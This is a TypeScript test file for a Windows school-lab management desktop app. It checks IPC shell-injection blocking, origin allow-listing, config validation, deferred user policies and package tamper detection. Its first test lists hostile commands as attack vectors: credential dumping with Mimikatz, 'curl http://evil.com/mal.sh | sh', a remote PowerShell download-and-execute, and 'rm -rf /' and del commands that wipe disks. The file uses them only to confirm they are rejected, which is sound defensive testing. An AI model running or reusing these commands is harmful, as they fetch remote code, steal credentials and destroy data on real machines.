import test from "node:test";
import assert from "node:assert/strict";

import {
  IPC_CONSTANTS,
  IpcEnvelope,
  DiskInfoDto
} from "../../src/desktop/contracts";
import { MockDesktopAgent, validateNoArbitraryShell } from "../../src/desktop/mock-agent";
import { defaultConfig } from "../../src/lib/default-config";
import { getConfigErrors } from "../../src/lib/validation";
import { evaluatePilotReadiness } from "../../src/lib/pilot";
import { parsePreflightReportJson } from "../../src/lib/preflight";
import {
  generateSetupScript,
  generateMaintenanceScript,
  generateVerifyScript
} from "../../src/lib/generator";
import {
  buildPackageManifest,
  buildWinLabPackageFiles,
  getBasePackageFiles,
  verifyPackageFiles
} from "../../src/lib/package-integrity";
import { MockWebView2Host, PolicyEngineSimulator } from "./harness";

test("Tier 2 [Boundary 1]: Shell injection attempts in IPC payload are strictly blocked across varied attack vectors", async () => {
  const host = new MockWebView2Host();
  const attackVectors = [
    "powershell.exe -ExecutionPolicy Bypass -Command 'Invoke-Mimikatz'",
    "cmd.exe /c del /f /s /q C:\\*",
    "pwsh.exe -EncodedCommand Zm9vYmFy",
    "bash -c 'curl http://evil.com/mal.sh | sh'",
    "iex (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')",
    "wscript.shell Run('powershell.exe')",
    "eval('require(\"child_process\").exec(\"rm -rf /\")')",
    "System.Diagnostics.Process.Start(\"cmd.exe\")",
    "powershell -c Start-Process evil.exe"
  ];

  for (const attack of attackVectors) {
    // 1. Direct validation check
    const valResult = validateNoArbitraryShell(attack);
    assert.equal(valResult.isSafe, false, `Expected attack to be blocked: ${attack}`);
    assert.match(valResult.error ?? "", /Forbidden executable or script pattern detected/);

    // 2. Nested payload injection in IPC envelope
    const envelope: IpcEnvelope = {
      id: crypto.randomUUID(),
      version: IPC_CONSTANTS.PROTOCOL_VERSION,
      timestamp: new Date().toISOString(),
      type: "command",
      action: IPC_CONSTANTS.ACTION_QUERY_INVENTORY,
      payload: {
        filter: {
          subquery: attack
        }
      }
    };

    const res = await host.postWebMessage(JSON.stringify(envelope), MockWebView2Host.TRUSTED_ORIGIN);
    assert.equal(res.status, "accepted");
    assert.ok(res.response);
    assert.equal(res.response.success, false);
    assert.equal(res.response.errorCode, "FORBIDDEN_SHELL_INJECTION");
  }
});

test("Tier 2 [Boundary 2]: Unauthorized web origins posting to WebView2 bridge are rejected", async () => {
  const host = new MockWebView2Host();
  const unauthorizedOrigins = [
    "http://evil.com",
    "https://phishing.site",
    "http://localhost:8080",
    "http://localhost:3000", // even localhost is rejected if not using virtual host
    "null",
    "file:///C:/Users/Attacker/exploit.html"
  ];

  const validEnvelope: IpcEnvelope = {
    id: crypto.randomUUID(),
    version: IPC_CONSTANTS.PROTOCOL_VERSION,
    timestamp: new Date().toISOString(),
    type: "query",
    action: IPC_CONSTANTS.ACTION_QUERY_INVENTORY
  };
  const rawMsg = JSON.stringify(validEnvelope);

  for (const origin of unauthorizedOrigins) {
    const res = await host.postWebMessage(rawMsg, origin);
    assert.equal(res.status, "rejected");
    assert.match(res.error ?? "", /UNAUTHORIZED_ORIGIN/);
    assert.equal(res.response, undefined);
  }

  // Trusted origin succeeds
  const trustedRes = await host.postWebMessage(rawMsg, MockWebView2Host.TRUSTED_ORIGIN);
  assert.equal(trustedRes.status, "accepted");
  assert.equal(trustedRes.response?.success, true);
});

test("Tier 2 [Boundary 3]: Target student account identical to administrator account triggers immediate BLOCK", () => {
  const collisions = [
    { student: "Administrador", admin: "Administrador" },
    { student: "administrador", admin: "ADMINISTRADOR" },
    { student: "Aluno", admin: "aluno" },
    { student: "MicrolinsAdmin", admin: "microlinsadmin" }
  ];

  for (const { student, admin } of collisions) {
    const config = {
      ...defaultConfig,
      studentUser: student,
      adminUser: admin
    };

    const errors = getConfigErrors(config);
    assert.ok(
      errors.some((e) => e.field === "studentUser" && e.message.includes("precisam ter nomes diferentes")),
      `Expected error for identical student/admin collision: student='${student}', admin='${admin}'`
    );

    // Readiness evaluation must immediately BLOCK
    const readiness = evaluatePilotReadiness(config, null);
    assert.equal(readiness.status, "BLOCKED");
    const blockedGate = readiness.gates.find((g) => g.id === "config.studentUser");
    assert.ok(blockedGate);
    assert.equal(blockedGate.status, "BLOCK");
  }
});

test("Tier 2 [Boundary 4]: Missing wwwroot directory in Release mode displays graceful fatal error dialog rather than fallback to localhost", () => {
  // Release build with missing wwwroot
  const releaseHost = new MockWebView2Host({ isReleaseBuild: true, wwwrootExists: false });
  assert.equal(releaseHost.activeVirtualHostMapping, null);
  assert.equal(releaseHost.currentUrl, null);
  assert.ok(releaseHost.lastFatalError !== null);
  assert.match(releaseHost.lastFatalError, /FATAL_MISSING_WWWROOT/);
  assert.notEqual(releaseHost.currentUrl, "http://localhost:3000/desktop");

  // In Debug build, fallback to localhost is permitted for developer convenience
  const debugHost = new MockWebView2Host({ isReleaseBuild: false, wwwrootExists: false });
  assert.equal(debugHost.currentUrl, "http://localhost:3000/desktop");
  assert.equal(debugHost.lastFatalError, null);
});

test("Tier 2 [Boundary 5]: Low free disk space (< 5%) triggers explicit storage warning and threshold verification", () => {
  const config = {
    ...defaultConfig,
    storageWarningFreePercent: 5
  };

  const maintScript = generateMaintenanceScript(config);

  // Script must test disk free space against configured threshold
  assert.match(maintScript, /\$StorageWarningFreePercent = 5/);
  assert.match(maintScript, /if \(\$freePercent -lt \$StorageWarningFreePercent\)/);
  assert.match(maintScript, /Write-Warning \("Espaço livre abaixo do limite configurado de/);

  // Validate DiskInfoDto model with critical low storage (< 5%)
  const lowDisk: DiskInfoDto = {
    device: "C:",
    totalGb: 256.0,
    freeGb: 7.68,
    freePercent: 3.0 // 3% < 5% threshold
  };
  assert.ok(lowDisk.freePercent < config.storageWarningFreePercent);
});

test("Tier 2 [Boundary 6]: Student account with unmounted NTUSER.DAT defers user policies to scheduled task", () => {
  const script = generateSetupScript(defaultConfig);

  // Must test if student profile NTUSER.DAT exists
  assert.match(script, /function Test-StudentProfileReady/);
  assert.match(script, /Join-Path \$profile\.LocalPath "NTUSER\.DAT"/);

  // If not ready, queues first-logon scheduled task
  assert.match(script, /Queue-StudentPoliciesForFirstLogon/);
  assert.match(script, /New-ScheduledTaskTrigger -AtLogOn -User/);
  assert.match(script, /\$userPoliciesDeferred = \$true/);
  assert.match(script, /-UserPoliciesDeferred \$userPoliciesDeferred/);

  // Upon logon, completes deferred policies and unregisters task
  assert.match(script, /Complete-DeferredUserPolicies/);
  assert.match(script, /Unregister-ScheduledTask -TaskName \$DeferredTaskName/);
});

test("Tier 2 [Boundary 7]: Multiple consecutive policy applies maintain idempotent state without overwriting initial baseline", () => {
  const engine = new PolicyEngineSimulator([
    {
      id: "personalization.wallpaper",
      name: "Bloquear Papel de Parede",
      category: "Personalização",
      desiredState: "Blocked",
      configuredState: "NotConfigured",
      effectiveState: "NotConfigured",
      requiresLogoff: true,
      requiresRestart: false
    }
  ]);

  const tx1 = crypto.randomUUID();
  const capture1 = engine.captureBaseline(tx1);
  assert.equal(capture1.wasCaptured, true);
  assert.equal(capture1.transactionId, tx1);

  // Second apply with a new transaction ID
  const tx2 = crypto.randomUUID();
  const capture2 = engine.captureBaseline(tx2);
  // Must preserve tx1 baseline rather than overwriting with tx2!
  assert.equal(capture2.wasCaptured, false);
  assert.equal(capture2.transactionId, tx1);

  // Verify setup script logic contains the baseline preservation check
  const setup = generateSetupScript(defaultConfig);
  assert.match(setup, /function Ensure-RegistryBaseline/);
  assert.match(setup, /if \(\$state -and \$state\.registryBaselineDir\)/);
  assert.match(setup, /Baseline de registro preservado/);
});

test("Tier 2 [Boundary 8]: Corrupted state.json and package manifests are safely detected and quarantined without crashing", async () => {
  // 1. Malformed JSON parsing handles error gracefully
  assert.throws(
    () => parsePreflightReportJson("{ invalid json "),
    /O relatório de preflight não contém JSON válido/
  );

  // Incompatible schema version
  assert.throws(
    () => parsePreflightReportJson(JSON.stringify({ schemaVersion: 99 })),
    /Relatório de preflight incompatível/
  );

  // 2. Package manifest verification detects tampered file content
  const baseFiles = getBasePackageFiles(defaultConfig);
  const manifest = await buildPackageManifest(defaultConfig, baseFiles, {
    channel: "standard",
    packageId: "test-package-boundary",
    targetComputerName: null
  });
  const tamperedFiles = baseFiles.map((f) =>
    f.name === "setup.ps1" ? { ...f, content: f.content + "\n# Tampered line!" } : f
  );

  const verification = await verifyPackageFiles(manifest, tamperedFiles);
  assert.equal(verification.ok, false, "Must detect tampered setup.ps1 file");
  assert.ok(verification.failures.some((fail) => fail.name === "setup.ps1" && (fail.reason === "hash" || fail.reason === "size")));

  // 3. Verify script safely inspects state.json in try/catch block
  const verifyScript = generateVerifyScript(defaultConfig);
  assert.match(verifyScript, /if \(Test-Path \$statePath\)/);
  assert.match(verifyScript, /try \{[\s\S]*\$state = Get-Content[\s\S]*catch \{/);
});
